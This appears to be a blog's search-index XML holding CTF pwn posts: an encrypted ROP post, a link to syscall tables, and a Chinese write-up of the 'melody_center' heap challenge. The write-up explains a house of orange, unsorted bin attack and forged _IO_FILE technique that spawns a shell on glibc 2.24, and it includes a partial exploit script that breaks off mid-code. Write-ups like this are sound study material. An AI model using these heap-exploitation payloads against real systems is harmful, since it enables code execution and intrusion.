<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn rop: De-ASLR</title>
      <link href="/2020/02/17/pwn-rop-De-ASLR/"/>
      <url>/2020/02/17/pwn-rop-De-ASLR/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a4efd7689df4294ede5d3c816fd065a0fa2a2e1233c4fda9954397a36bcc572f">e349518e006051a9b4c8cb8fb263e8ad8afedf5e8be7b6e5476ae1832e7434779a4574923968e3c085f0a781987f07dc30677309183eacb2dbcb6a3ce90fe6fb8dc98a49f8cdfdfc3d6ea65b3d0983cbb6d391efa9a109838a490c7f107db4941c84ff434aa14552616c30240d44b1639eca48cc7cdda6c0f45dc6a671aa3e982f1cd65572380097ba40031446f8805ab66710bdc5549bfd29df438692deb0f1a795a8de4bc10b099202ee05bae65fc779479d92f6ac5f19a5e7d0af5d0260dc5114ee5b73e1f906f05754a5d8a2d86c6a985927a9b28685ae2d1767d60fbd6cc5d47abf05a396b0ec9ca1caa0d550441ccb05609d1c606929607a9ef10952e47f0c57b07855a2a0f2edc50ddfbcbbbc1107243d42637861da632af8acb1e85cccc9f5f83b847e35fa2d356d2c6abc05209e43b58d91940f04a2c5013056c158fc2b2158d2e745f4ed62e9a8db1a6db9511cebb79d1619274a9d0fc491ac5cc3bf429ae7e21315b850ae7436aa637a2083b257f6d9b6959ac0db289593e85283f3be41f8f14d5c4a010b777879c31a168798843269dd409b3ccf9974630fc2befabf6c2161c3ea68ee068c25ad06b24ec9f352f356059376325274a582abdbf36bb9f584be12e69a73d7d3ee42312f7fed60c41997452e1e2b04d5d5298e4a376d3937fc7d76498b0c1a27deb6fcfc0c7a4ffce9082d11fa66b7413de459ae7d68d7f5d0bf57fa694b4208f7dfd365e5f23de37023109961c198c9b0ebfb439e3acb97115ff1b162c3290f184b3133724e6710b62d02fe389c6c0de54777a97c241d126a21dc15cd8632fae10a27b14142751ceb9bd372dd25c1de04102f1a555950416793dc5df0d5f6d94d9086638d5eb7e9b611070dc7e972ff8eef0cd085e19f3a3936c3476117724c6db226d00c467b093eb209d4011a9eb14e774907c6cdd66180459e5efde6fbf66adec015f49c0cb0123984f7b46450e3f255ae6e4708ccf19b6bf5e7589d3b5494b67c849001d06f16d77f9ec007bbfe1281ff10bed54849b206f2ce2f9ca0aa3c4d4dfbeb5657aa16c1685307841c636b5bd137bef4a3ab0bc95f5197fefefa951e5a55dd15296dae25f19a2ca7c4e165ce95c3d4b408ff077dad55c91c87ff83f5e3ebf81c3d3c4f7851d83fac12d60efb141511a9c8069e27e707b0fa388a8279738d0b1ef121e9790f091543e2d1cb7b3daee8bd7d825095ca450a5248f0e21883a9f909fb3ba8c1786abef844539582162d45798e446ae3c1cee10f27e3a150134c78faddc21b5e7a33f80525738bbf13ff77344b37ca47eb45dd399e61360424c614c381cac2b330e0281ee6bdb1343caa99cac5ba1f78696c2869ca0e27883478a9726aee76ab4481678cacd47bf40ea1365d3608071702bb84d87233b20901a842584bfe5940d0a2253f31426b9d3a8206511a341d38decdde3acd520169d07c0d02cff1b3090740b186966d63fd9a315bd7cee0d34c1d22de5a68bf25b2d43a17630448925f9eac27355b991afafcb150bbfc0ca4eda727fc073b309622a22cf6d6bb7a8dab0d4e47ad850ca87efd5a565473b2891cfcf1a2fd454d1694fa56bfcca10612a11173e0cf0a5ff30d6c207980c87e7e8619e1568038467d1bda188832b9f9e93afe9d4ca9194c65affe63f7a4f1860c5d0aa679d7a33ab9310ae2933545951f7e3f9f7d31b3d6fe360f01b1e9b4fc80e7225910785d113dfd94949a0a01e61521a1c11dda9b264af49e4e424b22ae819aebefc3a52673b8e868d198360291910662e58556a13f293ce53470e76753e56c1f1265dd1abe258f601d0bd6240c1eaf4bd6fe3746663f006c9b091c076026a4d76a68f50aaa30a8b54376e0d75e56a939c53517c2a05505023674d55afab5fc4bdb728bccb18a93b81951356b7a6a77dc32bc2221bb7e961b83626ce9b148deec75af4668e1b0b3d0b69042a84814ffe246b174156f478513678b3281657357f0a403b86a77c3ecc808d4daf953492346fd3cd964376794115d397e88fe0e015bb8610fca7525588a2c8cd1f5bcc6ed96c51ad9dfeb0855197c7dc7f77f29d84e6446f11b98534cf99fc08978018873b5464031ab825e204f0c596bee682aa9dfad765d978f12afbe115acfda013c285f5189059b8ed9966c04aa434261f170d4a389fdcc736696430f2b7562ff4454638d35bbfb12e25d141290548215562a8fb0303a0311633670c7c961af84b68de0cce82157632d9d368f6c5429a083204546458b0f3021d64f9fba690743b98770c07d38de4e630ccac996433bd686860c6e92715c5abfdc0768ca9ea945ffcf2f6cc25fca8bddf5d5ea53b3c87bfbc25a29999f57aadd2b12dc1337f3624429872820f63987d59f59d2b99ad8e1c9ac447cdc5eb0b68daafc1266ce8436a1ecb35f5f531813cb69748278f149f738246ac7e091694cfd62125717cab147cf002c62f2c482ebd87ca54c37e1ffcb8d91f0b337334791dcb36a4db37a82ceda67946424df5303a5dae0e5df647bbd964966a36e582b6e58296bffe5c45ef0a872020ac6ba7d1bddf03161371b3d6397c7d7de8e814f2740bd1c5295f3c98647af73493c08e4288a71bbb2ae82d9dfe6a19309810cd754733ff4936c5ce6a0d33b4146f55d2c27f8e6ca9248fa55570e422dd648b752958e59e6bab91e0c8d42d735b32bb3d86781b08014102b96a31dd280b1bd22b87960b8b608c8291f413af0bea426c38fafff89babe7bc426c67f3a75dc10b7c14e7c90082c2cf3ac9ea352a71bf38bc06867bbd8eddf6cafa41a4cac6d853dfb07a8229a46a0227aa0de05140a26a2017e41c992b95c2548ae4fa46b6d19b53be015d44509b24e65417284cc852a8bfcf98497aa6534898118b46b6d3fb63615e1591f2d49254c4e6f5456b17a4a8b8a8edecab9c712df0188d629705c6de28359a6213f06d149bac6827dc34d2187265d34061741c1160c6cdcb807abc9b063f9b7d841a84300910856040cded67cd33e8e72fa3629e778842eb6d2ff93d4356f7e9746a1f2289c259789b268e881aa65e43aa081dae985d16df8743f8846febb220590b0e3468c4d60fbccd8076f3e90b9035974718868fcaa613f8f36e4c35e44986c578471710d5e53fca8d5823709ee9de327dcef86291cc96f2b805780508a60c53f138ca7ae4a9516adc9339c78ddab6d75d402b77053880f798e4d012e155cca842f7519674836a798a782fa198bc4a4f05018ff45ab3fe6eb29c331b2708090c8d24a3d244356c98796687746e09aa5cde217210946d8616ae245bfd2faaad621adbf9db8ce9a40843d9b895843f5cd9b0fc544b444ea681d4873bdb0393f90acd5edfa74035151cbcb80370ed163f050e62982e94863ab7082612247e43c9b679c5d17d89db68295b26850229bf226e2dfafb378635414daab257da4fad6cfea32bc961f88e9c9e49b904ba156cb229541a90a7226326ccc7149b99b4174377d1b63f27639880b44d6abd00e6fb4e8d8d5c2b9e8d8d30af24a590da8808a6f0658104319b1c1751cd795e03e3dfd6fbb2f2730c814de8a8537df2c68af0643f5f57ea6eb384929642bc07f5c03d50be4cd6e4423b69c695e2a603388da275fb9589ef71458ea306dbf86788fb6d59139a4c69c8fb10560d18a904ecd5615bb3c56fe36a6e87cf94bd0cbbd453e973e4e041674687715ce950fb5e8c4886fb643b37637a91373107368ff1bee230768f979a82acbe72919eec390777dc48461d9ed2ed917f3c56e686c6c4cea901d912015f41f980e7d0aff7b98a30844f58ff8255cda72d968f6a5a626e6406870ff6157365dc4c1f09b81c384f21293e4898db924546d70ae3c4aa9524c354bca5abb47ff018f0ef1702fdb63e2616ce1f42826d39504003201941ba34499f18488526995722a62c390d5882aa8183c3ac02c61d05f81970086332977fccc7558fd821c81e38da791eff1fc8ba9ee7279ed1027d94751affac2e410597a55bc513c927f2c09b2badd72b9ae108a96c416adc8be06ca6cf02ac2efb09aea3d28358d27098bba33e9a3ac190ecf40a0237442579742339bdfc0712fdaeddfcde2c0c2a364f70ccb46310004c01ac6e793d9d04e9724ddd1214ce460527fd56466aa366be597b24fc93d4d69b2b49ba554b17ab9652f1b30eb0e8832b622db5557d4f0a2ba22d460baee2def96c50160022ba808a87124fbf7c47307ddbd0fb1db12187922b125e3e7b793aecbe6b459ce8df7d490b6e8ac541d425237ad7446ecc8ab757260cf1883a13270479d8d15a009a8210a4ab70daa8e63a229b1dedb9adaabc802798d01618ab2b1b29e520aebc877dacdc40bf65ba35fc152165fe005c6208facd259ec7d9c8282a8fe2adc8d510302b5322910161e600f98b20e9c9ace4dec301ea403815b6bed5af3c425e01d40cb724ecf1ba7061971afeca59d4730a52a1acde26fb58e41b221bed1d2f49b4b6db33014a8e8f25a875eaa98ccbfe373874c20cc5db21a3bf9695b1e6e256937171ba04e386d1c71934e9b4105450435df081595eee6fe9a40058a6700e5ecab6a980f35aa936a65f0051fa7eafda63bf2535ba8a7873965a532b9eee5302a8b0dcb6cb28ec30c7235fd1db291f25bb821ec22328b8a13cf9d45e8dca6dba2f603a4cd5519d5ce718f8934abb3d1199d1fcd75067e386d10142a49487bd94a7f81849d03622269de0866950c7245a545270dc7e6c71d12ff7d60acb07620f84f2ee677da9c3e028439cf4df230715afc009ed84b710a3dcf7257f5057157bbe7d7a8f6d7f303363a9a9a4fd01437e67136c62327f0b2325a7431fdac6f712b5dc3b45388a1c938c4c4618b41cdf4c934103c6a71ada0a326ce709ad579d50fcb15190cd82d0283f255a4838e314ddb139767a627226084d58d46d4d768d1b9ada5d95c10a86a1f261cc37fcb2d6b074841d125b161de66520cc4325c00443f90b9f0ea468e9f469abef83a09a9ad7318e470eccabd83e90df05b951ac89b479448640fd74650a61ade4e0e848332fe79cd8b06192644e898f74f5724db71449a962086728b0fe381b2d51d422589757b5607df5216d929dd3b45e59e771f36db66d211837170f0724322cdb8267d7ce037ac46c524d356b9caf288587e2d2bc1395718de82b547ea6683608403bf09a22a20c06612d7c317779592c708b77c250bcbf75bc10ec42ce214d4cb115a9c688d455874ca70626a90c211d584b3351ac5c62c4188b8dcb2bb265de388374920319b5435ba380c975fd887e00f36f444a1c6a93f694305ddc75ce8b39110063943bd89c32a80b50eb299a46193d3364aac8629beef60db7a35f00c23f962737ead7fc853ea777721df1016974c18f1a6593d1069f693373dae2903f640f6d94bd44284e82a19e3309de821d04054182a58e63db7d289d6e72ffebc010b16ab2d43658bbe1b4f297e9eb7d9ee64acaf43ce440450af56efe3a5bc9975f246885a5e349df5dff2948b2ce4ecd6eb75dc201b793f07322e00a628b3b3396580f62dbaf9f0b902a8b578921a9b9f0ba738327f5f60298b71d20fdbd74ccd0e51128a1ace53475bc82d5dbf4b2ff4effa4c011a463913c1dc34a5b24c0bc6afa25a783752e74a1c02aa8236fa4c9cfddf57fbb8d4c5bdcf1d268b7be290f07298bc974c1bf4df91e9f7e36833651563b93834f98e3efcd01127dce1c56a795aeaef33a28cfb9ce6e907cec473afe1eb293deaa74cb2e7f63805811ff4c93d804d753049531985a4c671657334700caa6cee58d66c2568e16a1cba4c76085fdceb688a8253040fac5f6d1805d2411b089bd861acae4c57595e49b5336f71b07731af1a676463e076ca666cdff3f50b54cff7f157693b70202f18b52e536e851b919c670697d4fb4933992192ccc352e4a2f938ea1b1b0c7f7af2ac092fd50b388f7b6d86e0c123c05432899badf6cc9c0c991d784db71e57834dfb6d2bec41cbc072114e2b84bf29e9b071b5af8980481d035be7f2e52334e34951b3e4c52802852e79c17f72c14b3923ce5a543726460164dc547b8ebbd5e74b4cfab3a8db509e493d41c95b5d4d65c0677228ca9fb84352c81796c3688bec55f6a0b5aa8e261b509164eb3f688697a1198e5f1effcde03e5c2e4e9a8520f4f576275c5aad57444111fa5e3ce747080954fdc0df2871b16e90a56b69f3b0c5fca99eda6b29dab68e292d943d4ee2e8e3e92dbce5594e286a1c83bf03bf76ada6ee87510935c6ff127ca52fe1cacf6fc24335ba425a945fbf800a3fe144a54b2a336abaf77d6ab88c44d6483213f6d90c27ef42b96537895bc81104d162e1de0c4b5ca3c5ad6f2e346b65973b03af9d6c8ce583c19f598c25d24a4c8cc5081e070947933b547e3944323e24a79eaac76d4d2427b88c85e617240b1966bb40a27315865c3903abc37ccad7be67ccea3c31f60be98f403e1b78fb447d2f48a61c68a06021c22f0835b8a40fd9a8d6732e0a8fe22eb4bdf61dedbe0c65978d49df29f65fccdd9a0cae7f3c28b4c625d4d4973641e7f0cc01eb522268ead541ffb689619d6bbc646921dcbbe39c8a3155b17dcf18f1a92bb27988d39d39a2c1b7baf5fd1bd0e47ea2b6e907eff7eee43f899bca85a9f2ef60e5f2c85bf61aa0162ccc7b2e63bb9a5074f260da2ea6de8c3611b68cbf04cf1af3dc18ff30b05289f2c51cfa6bc439539027df7a1b9e85e9a6e49346abad0f4bc704015867c624b023962adb037da5edac773f4ba0a03966c0beb4dabb24b707b607570b190b4e0ca8dd76d598534ed78c0c92b779feb8ff4d66522548b94820301953869e5545635af3fbc421009606bff70fb7c714e2afb39fe0b9d9f56c613cf0a66207adf64158e1515e9e5b14ba999ca5d12121bd3653753a25db1fc59a9eeea612f603e1c73ba671151beb4a6ad7f76070f247d89171a19df84a244591c5b02a03b75cac9bc852bbb86d65c593699b331479627e0612b626bb4725de3f789821c08d2d44041d93b6be43e449beca8e3932be980276fc39d2f11d6dc1a9fb869e37b5ccf2e43504d2b9aa126550b1fc40c5dca9d9a03943bb281480edaa718c09202d8fd53856125b2f24ba9219abf90aaf0ad2760788e07362a3185d96cb3078af5684b6908cd7922b387b03eb0e1364137f8f91350af7702a020d25207df95bc302e4ccd51c3f0bb741cb4637c2c5588f277b881f9bf63831d04d77964cf28d7fc87e4984e3e8b4704673ef63250f9656d906d877f41f57a6fc0a914e7810f85d3d2964b3e80d7e705576c50c72240be7b788e93000009ba07cdbe2090d79fb192a10a3996682a0be380ba34d540ee6cdaa977b27531c565c6be3a74ca1be61a1c72a7a9fe4efb21266cdcdec2dc44d586308bae06d812e04404dd3cd7781ac254c78d248f81f2a3b1c89330fee27af53804bb66026eb8ad253bc34799f08867d0e9005a03b4c959919c275372750469a500c281f6b0f97e79f8c121c6bd8e29b2495b2dfac0984bf7a1c6684d89d2aba0ef17ef073af29685dc6d31c97b6fcab274b5450a382aa55f888b772b35909180cd79a72e74be4063d069707b986194fd39b179a75c93e1fdbfca98e655829e473a7c312d8e57f91f25d25a97c0fcf79d007924470017e71c0e43226f6f37bde225b339680c32602f52645cd76f5e237cfbf37d3c1279cfac2e705a933934505756f35014c53a23e21388c21898babd51e5e5646ad194ca11aa0e9a6d71dfd8784a14bbd30f3618997dc95af15d07cc19a40dd43893b8503d5cf972fb3670287bb01bfce042c45917f0cc66dbd60e449cffe881fd8e8695fae4fbd88c66b66cb1e320e48daf5e87e336152b38d50c26c6e4040fff2dbf66b4f742a79dac2e5f6e132b5c8a8a977bfbb0491c854a4234f45053c09efe6f137d9fb04c07d2e480093430d9f78424ce3c966f099c02d765306350106b32c4bca74b88a5b5e2c841fddf82f81d3d0a2c80ffdb05b3cf5b191a2342732d040e126a0f2021c0876432c0fe2d5d3b05e8438ab0555549145629ae9069f3868ff517b7bbef62877b154a0f24948e4b43e207145e164e3c9db296e6f12dcc62b71b57c0519a53ef6f7784670be1042c54ffd9a506dbf167d51369945a26d2d92b02efbde7c9dce73d6b6304f6d227bc0aa6b6ffea102b92838409c8094ec5153870337c7434ab4cc65e298eff0511bd9ac2f9c23a050ed4bcfa32cc5b9d371b1679f025240f712e6bf8b6ba9f26e00e44802775cc49550a5e21b8a7ceb0d2b95b191ff936f79c8f77bd0a823258cf166dde676f57ad2d06f84bb6127dfe1d4079b0a3d8266dda574babbea46a0a3020bfe0b812099a72b83c6eb15750253ddb46241bdbe077caa85440b39ebcf0ab01d41a4ce01a28207fcbb3c422689e9d5838c3fbd2467b624eeab7be8cf750c5f1148ebffa7b216d5932dd58c0ab5806044a7cce4ff3b68fd7667b2ccdd4122fdb71b235cb965aa1d4cf984bbde02c91a43845ca228e6e9b611951d646ebbf67940d0e3695763986443417eee5ac25aeea53a9f2f61bd06e48a74c67e56e0e98e02569b76140cfc8c982ffedcc31108ef229845ebdbd5d3f13bf9206cd9a1eae6362a66bc01ba9f8bb92833c3b2f81aae8521c7a2b9f37abe0c9f33fb7e088f46022f702f384b32bfbf970b71c9d5b46583c54713a4d93c376f47307eca01012214bf53b60b63a386cee83c6e0cd5a2fd4895ed9c5e5e5279a6809bf6a0f71ac09b57b3dc03a5c0960bee183aeac287a2be4047304992c6bce6f60594d840ccb47f73bb8b61a69a7d0b6a10e72d7d34407e4fc8526cdb4b0c73098ad22e039f07aee2cdcd3f5f7ccf3430c3508e1f6298d3e0104d647194b927301efc96cbdbab1b3e53570a14a99f1ef8c88cf0cd19db73663442d2f7ceeee53b2981d5a62d838886ad88af2fbc6b0c5cf5d1f7f67e9a4a10ab230849b00431b0da0f2bc5366cb72b1871bf6b50f247cbf372977cf6793cb1db872de5092bfa9ac2e603d9d4b5b9200d746f02697aba1a310a5d4cdf94b25be1eb54fcb43743241254295c96217ba04775a52ed3260b9c0369810c4fc97aa760cbcc8775bb3aba69d26af7b48513a4d488e9be871dfb283ca2ce9f4a6ba652333de72d187d914832c5bced0fb656fcc1444a0786c15dea59e46f4d6ba7c0287695a56094672954911c4e909a3a307971efd174364f3db0d57b83c056a5522990e9bf9b7aa3a17930e5fb765abea5929f4d5557a85836586245d3bc558ca9cae22ca9786fcb08c7ddef091fac90c5a3ceb826b00a5c57dc22c0f0555f5f1003d7b6e84bdc0953a457fc3708556886b99c631a4aff82404e7ba8ddbc928ff667ef17e6c0e4bcde34bca6728712231515e05467f6107f0f56931002e99d68b481f6c71d77170a05b75649bb69e67b16a3488c0fe5c3d7fe785877dc8b76a4dd047c69ecb181502228fe41d385248effcf721695a77351b0943d517dda506b47f6ec8c3eec6ad984e7835527d8ac01fca2b36eb3afe9c3068fe389658d5de9af6bea3a7951a1d5b23b13be0755cb811df555001859728f2a4c7f3ae6d7da5f897b2dbb7821ff64773c3309ff8c2eec4307bb6f148684c1b7b82a3db0d992998cc829d356adfb25debccfa3c652ca31d34d1361154ce491057bb00e6b370b399f5a725c762317474ff934ecec252eac17aff48e6c371ba77e33ddb7ddb10dcea52e33e4878fa6bb098aa54966037210d69400303b4ba30bba0bab446a9ac52db8cff85ab3db3747086597ffb68a3798d813341d6b8111df190d409de2245fd5bd241cc3622a057ddf8f8c44270243e56781e15b0b7f316816e40fd0d60d72e83e296cd4a56358679dc476d2dee95d29f7a80bb64003b16130fea1d45b46375ea1cd20b12a6d8c9956cf7245e11ffc1f246d563990b7f86df986c9cc09c11509c7c5fa009511b60f81ff087ae97a06aeff6ed7993eb583dcf33b8518f5d2ed82bbc1172167c37aae7cdf337d61a5c0d53a612dabfa99d176b4590ca556839c454ab83d04ae3586fab4f7880b28bbdfd5151a54b67d47cdd4d8c32f4f82b6ef717068da2572149375b27d7230590e0391d1a4ffaf69f29d46331a6089ad4ab0cf7c9032e6fbf06b1699274a40f57e538f9526fa5b9c3e8e7aa403f4e433bc92027ca3920aea2ebaa763ae912db8a535bb1b5e59dca35176ab88afa3457a0d3e9c5d2cebe85fc5e8990d9f1d2f984090c3e70606b124749c7cc4ab0b8cd1f34643af626d89cfb8ccb54da055793721a62324a632487657ff8cf30c24598648b3f18d2845c9e69b330277195c6aab6bc3b298af60bc9d9032f4a0fecab5657db4c4151680b8300333bb0efd61a8f43bd0e66e1e594640c75ac3fc33055aaaeee8386b0a71b441e755f37e5fba8231a99d6c795ad26577d7bbb58e54223c72c60307fcb4f9ca993bd42beccba27bc2119d5133c94696c120006e74b279fe517a632effe6e5289a45b4708e8f849b0263146b2b6f4a60cb7ada3c13b4f9ba989387a5a4156df736f29c31fcdc9e50422595ddbeb8765dbca0149b8f7bb35a508a68614396f4121d8cb37b1a4109aab8290a72b9b46e9fc4429879fa42e245b4b8a2a7f2e7230ecbfb71ec1fc5cdc0fc205786b79a2dc2172d7ef816ceba484fd7f7943dd8f14c554a0e54446f2f4d9e5073ba1ea842f4836881097cc4489e4d21520389cbff172ac8e70d829ab56b92500d9bdf6376c69b980a0ec9b35359ed90ec1fbeeb522e2b7253e09c53e65bf11355f36251f697dae4c2b6dafc10c9b05b073c4cdfefdb748b27534b9ef4778251850630777043765046b5a28617ada27c3721baad22fede6964e68c7460b76f5e48f7e42e39c66dcda79352d2276914c4127a24dfcd9565ede94e995c394a2470aa701b62e65dad2b0c084f934bf50511ee3e388cf834757d4789036d8610a74c23b494b4bb9d38a0a0efbf25117975b273a5122e4b605c45ca821fdf62687278419e0e2833ec76235096c9b8c770d2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux x86 和 x86_64 系统调用表</title>
      <link href="/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/"/>
      <url>/2020/02/12/linux-x86-%E5%92%8C-x86-64-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p><a href="https://syscalls32.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls32.paolostivanin.com/</a></p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h3><p><a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">https://syscalls64.paolostivanin.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> Reference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn heap: melody_center</title>
      <link href="/2020/02/07/pwn-heap-melody-center/"/>
      <url>/2020/02/07/pwn-heap-melody-center/</url>
      
        <content type="html"><![CDATA[<p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>保护全开，题目给了四个功能：</p><pre><code>1. Create                      2. Edit                        3. Show                        4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p><pre><code>           (chunk_1)+----+----+                    |    |0x31|          +----+----+(chunk_2)                    +----+----+          |    |size|              +-----|    |    |--------&gt; +----+----+              |     +----+----+          |    |    |              |     |    |    |          +----+----+              |     +----+----+          |    |    |              |                          +----+----+              |                          ...........              |                          +----+----+(chunk_3)              |                          |    |0x21|              |                          +----+----+              +------------------------&gt; |    |    |                                         +----+----+</code></pre><p><br>Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br>Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br>Exit就是调用exit(0)（用不上）</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p></li><li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p></li><li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p><pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p><pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy){if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]fp-&gt;_IO_buf_base = NULL;_IO_default_finish (fp, 0);}</code></pre></li><li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p></li><li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p><ol><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li><li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li><li><code>fp-&gt;_flags</code>= 0</li><li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li><li><code>fp+0xe8</code> = system_addr</li></ol></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">def create(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def edit(size, content, _217, _108):    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))    p.sendafter(&quot;Content: &quot;, content)    p.sendlineafter(&quot;217: &quot;, str(_217))    p.sendlineafter(&quot;108: &quot;, str(_108))def show():    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)    return p.recvuntil(&quot;==========&quot;)def exit():    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)def pack_file(_flags = 0,              _IO_read_ptr = 0,              _IO_read_end = 0,              _IO_read_base = 0,              _IO_write_base = 0,              _IO_write_ptr = 0,              _IO_write_end = 0,              _IO_buf_base = 0,              _IO_buf_end = 0,              _IO_save_base = 0,              _IO_backup_base = 0,              _IO_save_end = 0,              _IO_marker = 0,              _IO_chain = 0,              _fileno = 0,              _lock = 0,              _wide_data = 0,              _mode = 0):    file_struct = p32(_flags) + \                  p32(0) + \                  p64(_IO_read_ptr) + \                  p64(_IO_read_end) + \                  p64(_IO_read_base) + \                  p64(_IO_write_base) + \                  p64(_IO_write_ptr) + \                  p64(_IO_write_end) + \                  p64(_IO_buf_base) + \                  p64(_IO_buf_end) + \                  p64(_IO_save_base) + \                  p64(_IO_backup_base) + \                  p64(_IO_save_end) + \                  p64(_IO_marker) + \                  p64(_IO_chain) + \                  p32(_fileno)    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)    file_struct += p64(_lock)    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)    file_struct += p64(_wide_data)    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)    file_struct += p64(_mode)    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)    return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):    payload = pack_file(_flags = 0,                        _IO_read_ptr = 0x61, #smallbin5file_size                        _IO_read_end = main_arena_addr,                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,                        _IO_write_base = 0,                        _IO_write_ptr = 1,                        _IO_buf_base = binsh_addr,                        _mode = 0,                        )    payload += p64(_IO_str_jumps_addr - 8)    payload += p64(0) # paddding    payload += p64(system_addr)    return payloadmain_arena_offset = 0x3c1b00_IO_list_all_offset = 0x3c2500_IO_str_jumps_offset = 0x3be4c0system_offset = 0x456a0str_bin_sh_offset = 0x18ac40# old top chunk ==&gt; unsorted bincreate(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)# leak main_arena and then leak libccreate(8, &quot;B&quot; * 8, 217, 108)res = show()main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))libc_base = main_arena - 0x58 - main_arena_offset_IO_list_all = libc_base + _IO_list_all_offset_IO_str_jumps = libc_base + _IO_str_jumps_offsetsystem = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offset# use unsorted bin attack to make _IO_list_all = main_arena + 0x58# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 